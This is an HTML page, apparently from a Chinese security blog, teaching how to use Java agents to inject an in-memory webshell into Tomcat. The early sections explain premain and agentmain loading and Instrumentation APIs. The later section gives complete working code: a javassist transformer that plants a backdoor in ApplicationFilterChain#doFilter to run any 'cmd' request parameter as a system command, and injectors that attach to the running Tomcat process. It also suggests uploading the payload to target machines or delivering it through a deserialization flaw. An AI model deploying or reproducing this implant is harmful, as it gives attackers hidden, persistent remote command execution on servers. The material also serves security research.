@@ -1,0 +1,585 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    
+    
+    <link rel="shortcut icon" href="../../../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>java agent内存马 - ConsT27's Blog</title>
+    <link href="../../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "java agent\u5185\u5b58\u9a6c", url: "#_top", children: [
+              {title: "\u76ee\u5f55", url: "#_1" },
+              {title: "What is java agent", url: "#what-is-java-agent" },
+              {title: "\u52a8\u6001\u4fee\u6539\u5b57\u8282\u7801", url: "#_6" },
+              {title: "agent\u5185\u5b58\u9a6c\u6ce8\u5165", url: "#agent" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../../../js/base.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../tomcat%20Listener%EF%BC%8CFilter%E5%86%85%E5%AD%98%E9%A9%AC%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/tomcat%20Listener%EF%BC%8CFilter%E5%86%85%E5%AD%98%E9%A9%AC%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../tomcat%20Listener%EF%BC%8CFilter%E5%86%85%E5%AD%98%E9%A9%AC%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/tomcat%20Listener%EF%BC%8CFilter%E5%86%85%E5%AD%98%E9%A9%AC%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/" class="btn btn-xs btn-link">
+        tomcat Listener，Filter内存马简要分析
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../Spring%20Controller%E5%86%85%E5%AD%98%E9%A9%AC/Spring%20Controller%E5%86%85%E5%AD%98%E9%A9%AC/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../Spring%20Controller%E5%86%85%E5%AD%98%E9%A9%AC/Spring%20Controller%E5%86%85%E5%AD%98%E9%A9%AC/" class="btn btn-xs btn-link">
+        Spring Controller内存马
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="java-agent">java agent内存马</h1>
+<h2 id="_1">目录</h2>
+<ul>
+<li><a href="#What-is-java-agent">What is java agent</a><ul>
+<li><a href="#启动前加载">启动前加载</a><ul>
+<li><a href="#操作">操作</a></li>
+</ul>
+</li>
+<li><a href="#启动后加载">启动后加载</a><ul>
+<li><a href="#操作">操作</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#动态修改字节码">动态修改字节码</a><ul>
+<li><a href="#addTransformer">addTransformer</a></li>
+<li><a href="#getAllLoadedClasses">getAllLoadedClasses</a></li>
+<li><a href="#retransformClasses-">retransformClasses </a></li>
+<li><a href="#Demo">Demo</a></li>
+</ul>
+</li>
+<li><a href="#agent内存马注入">agent内存马注入</a><ul>
+<li><a href="#实操">实操</a><ul>
+<li><a href="#坑点">坑点</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="what-is-java-agent">What is java agent</h2>
+<p>agent,是JDK1.5提出的一个机制。
+它起到了 "代理"的作用，就像BurpSuite可以对浏览器进行代理、抓包，javaagent也可以对java程序的信息进行监控、修改等操作。</p>
+<p>JDK1.5后引入了 java.lang.instrument 包，这个包用于实现javaagent这个机制，它里面的API可以在不影响目标java程序正常编译的情况下</p>
+<p>动态修改其字节码，也就是说可以动态修改其类、方法、属性 等信息。</p>
+<p>javaagent的加载分为启动前加载（ jdk 1.5 以后）和启动后加载（jdk1.6以后），分别对应着premain 方法和agentmain 方法。</p>
+<h3 id="_2">启动前加载</h3>
+<p>启动前加载的原理是：在java程序main函数执行前，先执行java agent设定的premain方法。这个方法在JDK1.5被提供了出来。</p>
+<h4 id="_3">操作</h4>
+<p>首先我们创建一个普通的类</p>
+<pre><code class="language-c#">public class test {
+    public static void main(String[] args){
+        System.out.println(&quot;Hello World!&quot;);
+    }
+}
+
+</code></pre>
+<p>为其编写打包jar时所需要的的mainfest文件,test.mf。（注意mf文件中需要有一行空行）</p>
+<pre><code class="language-c#">Manifest-Version: 1.0
+Main-Class: test
+
+
+</code></pre>
+<p>再创建一个agent类</p>
+<pre><code class="language-c#">import java.lang.instrument.Instrumentation;
+
+public class agen {
+    public static void premain(String agentArgs, Instrumentation inst) throws Exception{
+        System.out.println(agentArgs);
+    }
+}
+</code></pre>
+<p>编写mainfest,agen.mf</p>
+<pre><code class="language-c#">Manifest-Version: 1.0
+Premain-Class: agen
+
+
+</code></pre>
+<p>然后执行以下指令，获得test.jar和agen.jar</p>
+<p><img alt="" src="../image/image_CadjoE02lG.png" /></p>
+<p>然后用以下指令在test.jar程序执行前先执行agen.jar</p>
+<pre><code class="language-c#">java -javaagent:agen.jar[=options] -jar test.jar
+</code></pre>
+<p><img alt="" src="../image/image_stpa7YalYd.png" /></p>
+<p>可以发现我们premain中的代码比main中的代码优先执行了。</p>
+<h3 id="_4">启动后加载</h3>
+<p>启动后加载原理是：在java程序启动后，使其指向我们设定的agentmain方法。agent内存马注入多用的是这种方式。</p>
+<p>要实现启动后加载需要两个java文件，一个定义agentmain方法，一个起到注入器的作用。</p>
+<h4 id="_5">操作</h4>
+<p>首先写agen.java</p>
+<pre><code class="language-c#">import java.lang.instrument.Instrumentation;
+
+public class agen{
+    public static void agentmain(String agentArgs, Instrumentation inst) {
+        for (int i = 0; i &lt; 10; i++) {
+            System.out.println(&quot;agentmain gogogogo&quot;);
+        }
+    }
+}
+</code></pre>
+<p>inject.java</p>
+<pre><code class="language-c#">import com.sun.tools.attach.AgentInitializationException;
+import com.sun.tools.attach.AgentLoadException;
+import com.sun.tools.attach.AttachNotSupportedException;
+import com.sun.tools.attach.VirtualMachine;
+
+import java.io.IOException;
+
+public class inject{
+    public static void main(String[] args) throws IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException {
+        String id = args[0];
+        String jarName = args[1];
+
+        System.out.println(&quot;id ==&gt; &quot; + id);
+        System.out.println(&quot;jarName ==&gt; &quot; + jarName);
+
+        VirtualMachine virtualMachine = VirtualMachine.attach(id);
+        virtualMachine.loadAgent(jarName);
+        virtualMachine.detach(); //断开与目标JVM的链接
+
+        System.out.println(&quot;ends&quot;);
+    }
+}
+</code></pre>
+<p>test.java</p>
+<pre><code class="language-c#">public class test {
+    public static void main(String[] args){
+        System.out.println(&quot;main begin!&quot;);
+        while(true){
+
+        }
+    }
+}
+
+</code></pre>
+<p>然后分别打包成jar包，其中agen.java的mf文件需要这样写</p>
+<pre><code class="language-c#">Manifest-Version: 1.0
+Agent-Class: agen
+
+
+</code></pre>
+<p><img alt="" src="../image/image_gsC3EDRj47.png" /></p>
+<p>这里输入test.jar 启动后的PID以及agentmain对应的jar包</p>
+<p><img alt="" src="../image/image_M3l9FUavpu.png" /></p>
+<p>可以发现确实注入了test.jar，且执行了agentmain里的方法。</p>
+<h2 id="_6">动态修改字节码</h2>
+<p>上文讲述了agent的概念以及两种加载方式，下面会对javaagent修改字节码这一功能进行详细叙述。</p>
+<p>动态修改字节码是使用Instrumentation来实现的，javaagent通过这个类与目标JVM进行交互，从而修改其数据，也就是修改其字节码。</p>
+<p>这个类是一个接口类，它有如下方法。</p>
+<pre><code class="language-c#">public interface Instrumentation {
+
+    //增加一个Class文件转换器
+    void addTransformer(ClassFileTransformer transformer);
+
+    // 删除一个类转换器
+    boolean getAllLoadedClasses(ClassFileTransformer transformer);
+
+    // 在类加载之后，重新定义 Class。这个很重要，该方法是1.6 之后加入的，事实上，该方法是 update 了一个类。
+    void retransformClasses(Class&lt;?&gt;... classes) throws UnmodifiableClassException;
+
+    // 判断目标类是否能够修改。
+    boolean isModifiableClass(Class&lt;?&gt; theClass);
+
+    // 获取目标已经加载的类。
+    @SuppressWarnings(&quot;rawtypes&quot;)
+    Class[] getAllLoadedClasses();
+
+    ......
+}
+</code></pre>
+<p>对于修改字节码，比较重要的方法有addTransformer、getAllLoadedClasses、retransformClasses 等。</p>
+<p>对于这些方法，有一个比较重要的概念是Transformer，它会拦截已加载的或者正在加载的类，并交由内部的transfrom方法进行处理，凭此可以用于修改class文件的字节码。</p>
+<p>另外，想要让agent类能够实现修改字节码等操作，需要在mf中增加以下行，若没有以下配置则可能会导致报错。</p>
+<pre><code class="language-c#">Can-Redefine-Classes: true
+Can-Retransform-Classes: true
+</code></pre>
+<h4 id="addtransformer">addTransformer</h4>
+<p><img alt="" src="../image/image_Yi-Xub-DKI.png" /></p>
+<p>通过该方法来注册Transformer，我们跟进ClassFileTransformer类来一窥Transformer的模样。</p>
+<p><img alt="" src="../image/image_H4ojz5bGkF.png" /></p>
+<p>可以发现它也是一个接口类，所以我们要自己编写继承于它的Transformer去实现它的transform方法.
+这个transform返回结果即转换后的字节码。</p>
+<p>Transformer会拦截已加载的或者正在加载的类，并交由内部的transfrom方法进行处理。</p>
+<p>我们这里写个小demo来输出所有被Transformer拦截的类。</p>
+<pre><code class="language-c#">import java.lang.instrument.Instrumentation;
+
+public class agen{
+    public static void agentmain(String agentArgs, Instrumentation inst) {
+        inst.addTransformer(new DefineTransformer(),true);
+        System.out.println(&quot;agent gogo&quot;);
+        Class[] classes = inst.getAllLoadedClasses();
+        for(Class clas:classes){
+            System.out.println(clas.getName());
+        }
+    }
+}
+</code></pre>
+<pre><code class="language-c#">import java.lang.instrument.ClassFileTransformer;
+import java.lang.instrument.IllegalClassFormatException;
+import java.security.ProtectionDomain;
+
+public class DefineTransformer implements ClassFileTransformer {
+    @Override
+    public byte[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {
+        System.out.println(className);
+        return new byte[0];
+    }
+}
+
+</code></pre>
+<p><img alt="" src="../image/image_BIcB4eDUtP.png" /></p>
+<h4 id="getallloadedclasses">getAllLoadedClasses</h4>
+<p>该方法可以列出所有已加载的class，并以数组形式返回。</p>
+<pre><code class="language-c#">import java.lang.instrument.Instrumentation;
+
+public class agen{
+    public static void agentmain(String agentArgs, Instrumentation inst) {
+        System.out.println(&quot;agent gogo&quot;);
+        Class[] classes = inst.getAllLoadedClasses();
+        for(Class clas:classes){
+            System.out.println(clas.getName());
+        }
+    }
+}
+</code></pre>
+<p><img alt="" src="../image/image_b3QucSr-bl.png" /></p>
+<h4 id="retransformclasses">retransformClasses&#x20;</h4>
+<p>这个方法能对已加载的class进行重新定义，可以配合getAllLoadedClasses方法来重新定义已加载对象。
+具体是将已加载对象拦截，交由Transformer#transform 方法处理。</p>
+<h4 id="demo">Demo</h4>
+<p>对上面的三个方法可能有了点懵懵懂懂的感觉，下面会通过一个内存马Demo来更深刻的认识agent是如何修改字节码的。</p>
+<p>这里直接借用木头师傅的图片</p>
+<p><img alt="" src="../image/image_Qq5NYRtJSv.png" /></p>
+<p>这里的意思是便是：当加载到指定类时，通过javassist技术修改其字节码，将恶意代码进行植入，从而达到了内存马的目的。</p>
+<h2 id="agent">agent内存马注入</h2>
+<p>这里以tomcat Filter 内存马为例，通过agent技术向其注入内存马。</p>
+<p>tomcat 调用Filter的栈帧顺序如下</p>
+<p><img alt="" src="../image/image_ffYb6z-I3G.png" /></p>
+<p>从图中可以看见它调用了ApplicationFilterChain#doFilter,这个方法的代码如下</p>
+<p><img alt="" src="../image/image_z8r6MW6q-w.png" /></p>
+<p>它调用了internalDofilter并传入了request,response参数进入了下一层，开始调用filterchain中各filter对象的Dofilter方法。
+不过我们想进行agent注入，完全不用到filterchain里去做文章，只需要修改ApplicationFilterChain#doFilter这个方法即可。</p>
+<p>filterchain中各filter对象调用Dofilter方法所需要的参数仅仅只要request，response和filterchain</p>
+<p><img alt="" src="../image/image_22WUMUy9DO.png" /></p>
+<p>而其中filterchain属性的作用仅仅是去调用filterchain中下一个filter的Dofilter方法，所以实际上被Dofilter方法调用来处理用户请求的参数只有response和request.
+下图是一个filter内存马，可以发现内存马仅在request和response上做了文章。</p>
+<p><img alt="" src="../image/image_H5OfFlFW9o.png" /></p>
+<p>而在ApplicationFilterChain#doFilter中我们已经获得了request和response属性，所以我们可以直接修改ApplicationFilterChain#doFilter字节码向其写入内存马。</p>
+<h3 id="_7">实操</h3>
+<p>我们先写好agent和Transformer。</p>
+<p>我们拦截类ApplicationFilterChain，去修改它的方法DoFilter。</p>
+<pre><code class="language-c#">import java.lang.instrument.Instrumentation;
+
+public class AgentMain {
+    public static final String ClassName = &quot;org.apache.catalina.core.ApplicationFilterChain&quot;;
+
+    public static void agentmain(String agentArgs, Instrumentation ins) {
+        ins.addTransformer(new DefineTransformer(),true);
+        // 获取所有已加载的类
+        Class[] classes = ins.getAllLoadedClasses();
+        for (Class clas:classes){
+            if (clas.getName().equals(ClassName)){
+                try{
+                    // 对类进行重新定义
+                    ins.retransformClasses(new Class[]{clas});
+                } catch (Exception e){
+                    e.printStackTrace();
+                }
+            }
+        }
+    }
+}
+</code></pre>
+<pre><code class="language-c#">import java.lang.instrument.ClassFileTransformer;
+import java.security.ProtectionDomain;
+import javassist.*;
+
+public class DefineTransformer implements ClassFileTransformer  {
+
+    public static final String ClassName = &quot;org.apache.catalina.core.ApplicationFilterChain&quot;;
+
+    public byte[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) {
+        System.out.println(&quot;transform begin&quot;);
+        className = className.replace(&quot;/&quot;,&quot;.&quot;);
+        if (className.equals(ClassName)){
+            System.out.println(&quot;Find the Inject Class: &quot; + ClassName);
+            ClassPool pool = ClassPool.getDefault();
+            if (classBeingRedefined != null) {  //这个地方必须加，它和获取相应ClassLoader有关，不加就有可能出现javassist.NotFoundException 错误
+                ClassClassPath classPath = new ClassClassPath(classBeingRedefined);
+                pool.insertClassPath(classPath);
+            }
+            try {
+                CtClass c = pool.getCtClass(className);
+                CtMethod m = c.getDeclaredMethod(&quot;doFilter&quot;);
+                m.insertBefore(&quot;System.out.println(321);\n&quot;+
+                        &quot;javax.servlet.http.HttpServletRequest req =  request;\n&quot; +
+                        &quot;javax.servlet.http.HttpServletResponse res = response;\n&quot; +
+                        &quot;java.lang.String cmd = request.getParameter(\&quot;cmd\&quot;);\n&quot; +
+                        &quot;if (cmd != null){\n&quot; +
+                        &quot;    try {\n&quot; +
+                        &quot;        java.io.InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();\n&quot; +
+                        &quot;        java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(in));\n&quot; +
+                        &quot;        String line;\n&quot; +
+                        &quot;        StringBuilder sb = new StringBuilder(\&quot;\&quot;);\n&quot; +
+                        &quot;        while ((line=reader.readLine()) != null){\n&quot; +
+                        &quot;            sb.append(line).append(\&quot;\\n\&quot;);\n&quot; +
+                        &quot;        }\n&quot; +
+                        &quot;        response.getOutputStream().print(sb.toString());\n&quot; +
+                        &quot;        response.getOutputStream().flush();\n&quot; +
+                        &quot;        response.getOutputStream().close();\n&quot; +
+                        &quot;    } catch (Exception e){\n&quot; +
+                        &quot;        e.printStackTrace();\n&quot; +
+                        &quot;    }\n&quot; +
+                        &quot;}&quot;);
+                byte[] bytes = c.toBytecode();
+                c.detach();
+                return bytes;
+            } catch (Exception e){
+                e.printStackTrace();
+            }
+        }
+        return new byte[0];
+    }
+}
+</code></pre>
+<p>然后打包成jar,我这里是用  命令mvn assembly:assembly打包的，pom长这样</p>
+<pre><code class="language-c#">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot;
+         xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
+         xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;
+    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;
+
+    &lt;build&gt;
+        &lt;plugins&gt;
+            &lt;plugin&gt;
+                &lt;artifactId&gt;maven-assembly-plugin&lt;/artifactId&gt;
+                &lt;configuration&gt;
+                    &lt;descriptorRefs&gt;
+                        &lt;descriptorRef&gt;jar-with-dependencies&lt;/descriptorRef&gt;
+                    &lt;/descriptorRefs&gt;
+                    &lt;archive&gt;
+                        &lt;manifestEntries&gt;
+                            &lt;Premain-Class&gt;agen&lt;/Premain-Class&gt;
+                            &lt;Agent-Class&gt;agen&lt;/Agent-Class&gt;
+                            &lt;Can-Redefine-Classes&gt;true&lt;/Can-Redefine-Classes&gt;
+                            &lt;Can-Retransform-Classes&gt;true&lt;/Can-Retransform-Classes&gt;
+                        &lt;/manifestEntries&gt;
+                    &lt;/archive&gt;
+                &lt;/configuration&gt;
+            &lt;/plugin&gt;
+
+        &lt;/plugins&gt;
+    &lt;/build&gt;
+
+
+    &lt;groupId&gt;groupId&lt;/groupId&gt;
+    &lt;artifactId&gt;agen&lt;/artifactId&gt;
+    &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;
+
+    &lt;dependencies&gt;
+        &lt;dependency&gt;
+                &lt;groupId&gt;javassist&lt;/groupId&gt;
+                &lt;artifactId&gt;javassist&lt;/artifactId&gt;
+                &lt;version&gt;3.12.1.GA&lt;/version&gt;
+        &lt;/dependency&gt;
+    &lt;/dependencies&gt;
+&lt;/project&gt;
+</code></pre>
+<p>然后写注入器</p>
+<pre><code class="language-c#">import com.sun.tools.attach.AgentInitializationException;
+import com.sun.tools.attach.AgentLoadException;
+import com.sun.tools.attach.AttachNotSupportedException;
+import com.sun.tools.attach.VirtualMachine;
+
+import java.io.IOException;
+
+public class inject{
+    public static void main(String[] args) throws IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException {
+        String id = args[0];
+        String jarName = args[1];
+
+        System.out.println(&quot;id ==&gt; &quot; + id);
+        System.out.println(&quot;jarName ==&gt; &quot; + jarName);
+
+        VirtualMachine virtualMachine = VirtualMachine.attach(id);
+        virtualMachine.loadAgent(jarName);
+        virtualMachine.detach(); //断开与目标JVM的链接
+
+        System.out.println(&quot;ends&quot;);
+    }
+}
+</code></pre>
+<p>然后我们可以把注入器打包成jar，将注入器和javaagent都上传到目标机器上，通过注入器将agent注入到目标tomcat中生成filter内存马。
+也可以只上传agent，然后通过反序列化漏洞接口进行命令执行，以此来执行我们注入器的命令将agent注入到tomcat中生成filter内存马。</p>
+<p>如果出现类找不到的情况，则需要通过URLClassLoader+反射加载我们所需要的类。
+这里直接借用木头师傅写好的 URLClassLoader+反射加载 的注入器</p>
+<pre><code class="language-c#">package main.java;
+
+import java.io.IOException;
+import java.lang.reflect.Method;
+import java.util.List;
+
+public class inject {
+    public static void main(String[] args) throws Exception{
+        try{
+            java.lang.String path = &quot;E:\\tools\\java\\idea\\agen\\target\\agen-1.0-SNAPSHOT-jar-with-dependencies.jar&quot;;
+            //这里是去加载注入器所需要的tools.jar，对应类为com.sun.tools
+            java.io.File toolsPath = new java.io.File(System.getProperty(&quot;java.home&quot;).replace(&quot;jre&quot;,&quot;lib&quot;) + java.io.File.separator + &quot;tools.jar&quot;);
+            java.net.URL url = toolsPath.toURI().toURL();
+            java.net.URLClassLoader classLoader = new java.net.URLClassLoader(new java.net.URL[]{url});
+            Class/*&lt;?&gt;*/ MyVirtualMachine = classLoader.loadClass(&quot;com.sun.tools.attach.VirtualMachine&quot;);
+            Class/*&lt;?&gt;*/ MyVirtualMachineDescriptor = classLoader.loadClass(&quot;com.sun.tools.attach.VirtualMachineDescriptor&quot;);
+            java.lang.reflect.Method listMethod = MyVirtualMachine.getDeclaredMethod(&quot;list&quot;,null);
+            java.util.List/*&lt;Object&gt;*/ list = (java.util.List/*&lt;Object&gt;*/) listMethod.invoke(MyVirtualMachine,null);
+
+            System.out.println(&quot;Running JVM list ...&quot;);
+            for(int i=0;i&lt;list.size();i++){
+                Object o = list.get(i);
+                java.lang.reflect.Method displayName = MyVirtualMachineDescriptor.getDeclaredMethod(&quot;displayName&quot;,null);
+                java.lang.String name = (java.lang.String) displayName.invoke(o,null);
+                System.out.println(name);
+                // 列出当前有哪些 JVM 进程在运行
+                // 这里的 if 条件根据实际情况进行更改
+                if (name.contains(&quot;org.apache.catalina.startup.Bootstrap start&quot;)){
+                    // 获取对应进程的 pid 号
+                    java.lang.reflect.Method getId = MyVirtualMachineDescriptor.getDeclaredMethod(&quot;id&quot;,null);
+                    java.lang.String id = (java.lang.String) getId.invoke(o,null);
+                    System.out.println(&quot;id &gt;&gt;&gt; &quot; + id);
+                    java.lang.reflect.Method attach = MyVirtualMachine.getDeclaredMethod(&quot;attach&quot;,new Class[]{java.lang.String.class});
+                    java.lang.Object vm = attach.invoke(o,new Object[]{id});
+                    java.lang.reflect.Method loadAgent = MyVirtualMachine.getDeclaredMethod(&quot;loadAgent&quot;,new Class[]{java.lang.String.class});
+                    loadAgent.invoke(vm,new Object[]{path});
+                    java.lang.reflect.Method detach = MyVirtualMachine.getDeclaredMethod(&quot;detach&quot;,null);
+                    detach.invoke(vm,null);
+                    System.out.println(&quot;Agent.jar Inject Success !!&quot;);
+                    break;
+                }
+            }
+        } catch (Exception e){
+            e.printStackTrace();
+        }
+    }
+}
+
+</code></pre>
+<p>这里是选择把注入器打包成jar用，用Manifest打包（主要是maven还没玩明白），上文有有关Manifest的相关步骤，所以此处具体步骤省略了。</p>
+<p>然后通过注射器将agent注入到tomcat中</p>
+<p><img alt="" src="../image/image_xA4RYqzolH.png" /></p>
+<p><img alt="" src="../image/image__D3fYCVhBY.png" /></p>
+<h4 id="_8">坑点</h4>
+<ol>
+<li>在transfrom方法中我们写了这一段代码</li>
+</ol>
+<pre><code class="language-c#">            if (classBeingRedefined != null) {  //这个地方必须加，它和获取相应ClassLoader有关，不加就有可能出现javassist.NotFoundException 错误
+                ClassClassPath classPath = new ClassClassPath(classBeingRedefined);
+                pool.insertClassPath(classPath);
+            }
+</code></pre>
+<p>如果不加这一段的话就会报错  javassist.NotFoundException:org.apache.catalina.core.ApplicationFilterChain</p>
+<p>原因是这样的</p>
+<p>“ClassPool.getDefault() 方法的搜索Classpath 只是搜索JVM的同路径下的class。当一个程序运行在JBoss或者Tomcat下，ClassPool Object 可能找到用户的classes。Javassist 提供了四种动态加载classpath的方法。”
+如果仅仅靠一个getDefault，是无法获取到tomcat的类的，因为tomcat的类并没有存放在JVM同路径下。</p>
+<p>要解决这个方法很简单，首先我们看一下transform提供的第三个参数的定义</p>
+<pre><code class="language-c#">classBeingRedefined:
+if this is triggered by a redefine or retransform, the class being redefined or retransformed; if this is a class load, null
+
+翻译过来就是，如果当前transform所处理的对象是已加载过的类，那么这个参数的值便是当前所处理的对象；如果是新加载的类，则为null
+</code></pre>
+<p>因为org.apache.catalina.core.ApplicationFilterChain在agent注入时肯定是已经加载过了的，所以我们可以直接通过这个参数来获得org.apache.catalina.core.ApplicationFilterChain的class对象，然后将其设置为javassist中ClassPool的ClassPath，这样就不会出现 javassist.NotFoundException了。</p>
+<p>2.maven打包的使用，还得好好看看，折腾了好半天</p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../tomcat%20Listener%EF%BC%8CFilter%E5%86%85%E5%AD%98%E9%A9%AC%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/tomcat%20Listener%EF%BC%8CFilter%E5%86%85%E5%AD%98%E9%A9%AC%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../tomcat%20Listener%EF%BC%8CFilter%E5%86%85%E5%AD%98%E9%A9%AC%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/tomcat%20Listener%EF%BC%8CFilter%E5%86%85%E5%AD%98%E9%A9%AC%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/" class="btn btn-xs btn-link">
+        tomcat Listener，Filter内存马简要分析
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../Spring%20Controller%E5%86%85%E5%AD%98%E9%A9%AC/Spring%20Controller%E5%86%85%E5%AD%98%E9%A9%AC/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../Spring%20Controller%E5%86%85%E5%AD%98%E9%A9%AC/Spring%20Controller%E5%86%85%E5%AD%98%E9%A9%AC/" class="btn btn-xs btn-link">
+        Spring Controller内存马
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="container-fluid wm-page-content">
+  <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
+</footer>
+
+</body>
+</html>
